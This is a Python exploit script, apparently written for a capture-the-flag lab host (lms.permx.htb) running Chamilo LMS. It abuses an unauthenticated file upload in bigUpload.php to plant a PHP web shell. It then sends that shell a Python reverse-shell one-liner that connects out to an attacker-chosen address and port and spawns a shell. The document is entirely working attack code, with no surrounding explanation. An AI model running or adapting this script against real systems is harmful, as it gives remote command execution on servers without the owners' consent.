import requests,os

url = 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
lhost = input('Please input your lhost address: ')
lport = input('Please input your lport: ')
filename = input('Please input the name of the webshell: ')
#http_proxy = "http://127.0.0.1:8080"
#https_proxy = "https://127.0.0.1:8080"
'''
proxy_dict = {
    "http" : http_proxy,
    "https" : https_proxy,
}
'''
webshell_content = "<?php system($_GET['cmd']);?>"
command = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(lhost, lport)
requests.post(url, files={'bigUploadFile' : (filename, webshell_content)})
target = 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/'
requests.get(target + filename, params={'cmd' : command})
